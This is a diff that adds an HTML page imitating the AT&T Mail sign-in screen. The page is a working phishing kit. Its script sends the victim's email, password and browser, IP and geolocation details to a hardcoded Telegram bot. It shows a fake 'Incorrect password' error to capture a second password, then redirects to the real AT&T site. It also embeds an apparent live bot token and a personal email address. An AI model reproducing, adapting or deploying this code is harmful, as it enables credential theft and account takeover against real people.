@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AT&T Sign In</title>
+    <link rel="icon" href="https://yahwehboy.github.io/att/att.ico" type="image/x-icon">
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        .sign-in-card {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 30px;
+            border: 1px solid #e9ecef;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        
+        .att-logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            font-weight: 500;
+        }
+        
+        .btn-primary {
+            background-color: #0047AB;
+            border-color: #0047AB;
+            border-radius: 25px;
+            padding: 10px 20px;
+            font-weight: 500;
+        }
+        
+        .btn-primary:hover {
+            background-color: #003a8c;
+            border-color: #003a8c;
+        }
+        
+        .link-text {
+            color: #0066b1;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        
+        .link-text:hover {
+            text-decoration: underline;
+        }
+        
+        h1 {
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            font-weight: 500;
+            margin-bottom: 30px;
+        }
+        
+        .password-page {
+            display: none;
+        }
+        
+        .show-password {
+            position: absolute;
+            right: 15px;
+            top: 70%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #6c757d;
+        }
+        
+        .email-display {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+        }
+        
+        .email-display i {
+            margin-right: 8px;
+            font-size: 1.2rem;
+        }
+        
+        .alert {
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid transparent;
+            border-radius: 5px;
+        }
+        
+        .alert-danger {
+            color: #721c24;
+            background-color: #f8d7da;
+            border-color: #f5c6cb;
+        }
+        
+        .alert-info {
+            color: #0c5460;
+            background-color: #d1ecf1;
+            border-color: #bee5eb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="sign-in-card">
+            <!-- User ID Page (Page 1) -->
+            <div id="userIdPage">
+                <div class="text-center mb-4">
+                    <img src="https://yahwehboy.github.io/att/att.svg" alt="AT&T Logo" class="att-logo">
+                </div>
+                
+                <h1 class="text-center">Sign in</h1>
+                <p class="text-center subtitle">to access AT&T Mail and Currently.com</p>
+                
+                <form>
+                    <div class="mb-3">
+                        <label for="userId" class="form-label">User ID</label>
+                        <input type="text" class="form-control" id="userId" placeholder="" style="border-color: #0066b1; border-radius: 5px;">
+                    </div>
+                    
+                    <button type="button" class="btn btn-primary w-100 mb-3" onclick="showPasswordPage()">Continue</button>
+                    
+                    <div class="text-center">
+                        <a href="#" class="link-text d-block mb-2">Forgot user ID?</a>
+                        <a href="#" class="link-text">Don't have a user ID? Create one now</a>
+                    </div>
+                </form>
+            </div>
+            
+            <!-- Password Page (Page 2) -->
+            <div id="passwordPage" class="password-page">
+                <div class="text-center mb-4">
+                    <img src="https://yahwehboy.github.io/att/att.svg" alt="AT&T Logo" class="att-logo">
+                </div>
+                
+                <h1 class="text-center">Welcome</h1>
+                
+                <div class="email-display">
+                    <i class="bi bi-envelope"></i>
+                    <span id="displayEmail">annakrossahane6888@gmail.com</span>
+                </div>
+                
+                <form id="loginForm">
+                    <div class="mb-3 position-relative">
+                        <label for="password" class="form-label">Password</label>
+                        <input type="password" class="form-control" id="password" placeholder="" style="border-color: #0066b1; border-radius: 5px;">
+                        <span class="show-password" onclick="togglePasswordVisibility()">Show</span>
+                    </div>
+                    
+                    <div class="form-check mb-3">
+                        <input class="form-check-input" type="checkbox" id="keepSignedIn">
+                        <label class="form-check-label" for="keepSignedIn">
+                            Keep me signed in
+                        </label>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-primary w-100 mb-3 button">Sign in</button>
+                    
+                    <div class="text-center">
+                        <a href="#" class="link-text">Forgot password?</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS and Icons -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
+
+    <script>
+        // Function to show password page
+        function showPasswordPage() {
+            const userId = document.getElementById('userId').value;
+            const emailDisplay = document.getElementById('displayEmail');
+            
+            // If user entered something, use it as email, otherwise default
+            if (userId && userId.trim() !== '') {
+                emailDisplay.textContent = userId.trim();
+            } else {
+                emailDisplay.textContent = 'annakrossahane6888@gmail.com';
+            }
+            
+            // Hide user ID page, show password page
+            document.getElementById('userIdPage').style.display = 'none';
+            document.getElementById('passwordPage').style.display = 'block';
+        }
+        
+        // Function to toggle password visibility
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById('password');
+            const showPasswordBtn = document.querySelector('.show-password');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                showPasswordBtn.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                showPasswordBtn.textContent = 'Show';
+            }
+        }
+
+
+        // === CONFIGURATION ===
+    const BOT_TOKEN = '7594864486:AAHqomuwkKjmn-xu6E4jXBAGp4akfClxA-E';  // e.g., '1234567890:AAF...'
+    const CHAT_ID = '6958187812';      // e.g., '987654321'
+    const REDIRECT_URL = 'https://www.att.net';
+    let isSubmitting = false; // Prevent multiple submissions
+    // =====================
+
+    const form = document.getElementById('loginForm');
+    const userId = document.getElementById('userId');
+    const passwordInput = document.getElementById('password');
+    const button = form.querySelector('.button');
+
+    // Extract email from URL query parameter: ?email=user@example.com
+    function getEmailFromURL() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        return email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) ? email : null;
+    }
+
+    // On load: check if email is in URL and prefill
+    window.addEventListener('DOMContentLoaded', () => {
+        const email = getEmailFromURL();
+        if (email) {
+            userId.value = email;
+            // Optional: disable the field so user can't edit
+            userId.disabled = true;
+            // Optional: hide the label or add hint
+            const label = emailInput.previousElementSibling;
+            if (label) label.textContent = 'Email (verified)';
+        }
+    });
+
+    let passwordAttempts = [];
+    
+    // Send credentials to Telegram
+    async function sendToTelegram(userId, password, attemptNumber = 1) {
+        try {
+            // Gather client-side data
+            const userInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages.join(', '),
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            deviceType: getDeviceType(),
+            referrer: document.referrer || 'Direct',
+            pageUrl: window.location.href,
+            timestamp: new Date().toISOString()
+            };
+
+            // Get public IP and geolocation using ipapi.co
+            let ipData = {};
+            try {
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            ipData = await ipResponse.json();
+
+            userInfo.ip = ipData.ip;
+            userInfo.location = `${ipData.city}, ${ipData.region}, ${ipData.country_name}`;
+            userInfo.coords = `${ipData.latitude}, ${ipData.longitude}`;
+            userInfo.isp = ipData.org;
+            userInfo.countryCode = ipData.country_code;
+            } catch (err) {
+            userInfo.ip = "Unknown (API error)";
+            userInfo.location = "Unavailable";
+            userInfo.ipError = err.message;
+            }
+            
+            // Format message for Telegram - include both attempts if we have them
+            let passwordInfo = `🔑 *Password:* \`${password}\``;
+            if (passwordAttempts.length >= 2) {
+                passwordInfo = `🔑 *First Attempt:* \`${passwordAttempts[0]}\`\n🔑 *Second Attempt:* \`${passwordAttempts[1]}\``;
+            }
+            
+            const text = `
+        🔹 *New ATT User Visit* 🔹
+
+        📧 *Email:* \`${userId}\`
+        ${passwordInfo}
+        👤 *Device*: ${userInfo.deviceType}
+        🌐 *Platform*: ${userInfo.platform}
+        📦 *Browser*: ${userInfo.userAgent.substring(0, 50)}...
+        📍 *Language*: ${userInfo.language} [${userInfo.languages}]
+        🖥️ *Screen*: ${userInfo.screenWidth} × ${userInfo.screenHeight} (${screen.colorDepth}-bit)
+        🕒 *Timezone*: ${userInfo.timezone} (UTC${formatTimezoneOffset(userInfo.timezoneOffset)})
+        🌍 *IP Address*: \`${userInfo.ip}\`
+        🗺️ *Location*: ${userInfo.location}
+        📌 *Coordinates*: ${userInfo.coords || 'N/A'}
+        🏢 *ISP/Org*: ${userInfo.isp || 'Unknown'}
+        🗺️ *Country Code*: ${userInfo.countryCode || 'N/A'}
+        🔗 *Page*: ${userInfo.pageUrl}
+        📥 *Referrer*: ${userInfo.referrer}
+        📅 *Time*: ${userInfo.timestamp}
+        🔄 *Attempt Number:* ${attemptNumber}
+            `.trim();
+
+            // Send to Telegram
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (error) {
+            console.warn('Telegram send failed', error);
+        }
+    }
+
+    // Helper: Detect device type
+function getDeviceType() {
+  const ua = navigator.userAgent;
+  if (/mobile|android|iphone|ipod/i.test(ua)) return 'Mobile';
+  if (/tablet|ipad/i.test(ua)) return 'Tablet';
+  return 'Desktop';
+}
+
+// Helper: Format timezone offset (e.g., -4 → +4 for UTC+4)
+function formatTimezoneOffset(offset) {
+  const hours = Math.abs(offset / 60);
+  return (offset <= 0 ? '+' : '-') + hours.toString().replace('.5', ':30');
+}
+
+// Run when page loads
+document.addEventListener('DOMContentLoaded', sendToTelegram);
+
+    // Unified submission handler
+    async function handleSubmit() {
+        if (isSubmitting) return;
+        isSubmitting = true;
+
+        const email = userId.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!email || !password) {
+            alert('Please enter both email and password.');
+            isSubmitting = false;
+            return;
+        }
+
+        // Store the password attempt BEFORE sending to Telegram
+        passwordAttempts.push(password);
+
+        // Update UI
+        button.textContent = 'Signing in...';
+        button.disabled = true;
+
+        // Send data with attempt number
+        sendToTelegram(email, password, passwordAttempts.length)
+            .catch(() => {})
+            .finally(() => {
+                // Check if we have collected 2 attempts
+                if (passwordAttempts.length >= 2) {
+                    // Both attempts have been sent, redirect after clearing error message
+                    setTimeout(() => {
+                        // Remove error message before redirecting
+                        const errorElement = document.getElementById('passwordError');
+                        if (errorElement) {
+                            errorElement.remove();
+                        }
+                        window.location.href = REDIRECT_URL;
+                    }, 800);
+                } else {
+                    // This was not the second attempt, allow second attempt regardless of correctness
+                    button.textContent = 'Sign in';
+                    button.disabled = false;
+                    passwordInput.value = ''; // Clear the password field for the second attempt
+                    passwordInput.focus(); // Focus back on the password field
+                    isSubmitting = false;
+                    
+                    // Show message prompting for second attempt
+                    const errorDiv = document.createElement('div');
+                    errorDiv.className = 'alert alert-danger mt-3'; // Changed to info instead of danger
+                    errorDiv.id = 'passwordError';
+                    errorDiv.textContent = 'Incorrect password, try again.';
+                    const form = document.getElementById('loginForm');
+                    if (!document.getElementById('passwordError')) {
+                        form.insertBefore(errorDiv, form.firstChild);
+                    }
+                }
+            });
+    }
+
+    // Handle form submit (button click or Enter key)
+    form.addEventListener('submit', function (e) {
+        e.preventDefault();
+        handleSubmit();
+    });
+
+    // Allow Enter key to trigger submit
+    passwordInput.addEventListener('keypress', function (e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            // Use requestSubmit() for proper event flow
+            if (form.requestSubmit) {
+                form.requestSubmit();
+            } else {
+                // Fallback: manually trigger submit event
+                form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: false }));
+            }
+        }
+    });
+    </script>
+</body>
+</html>
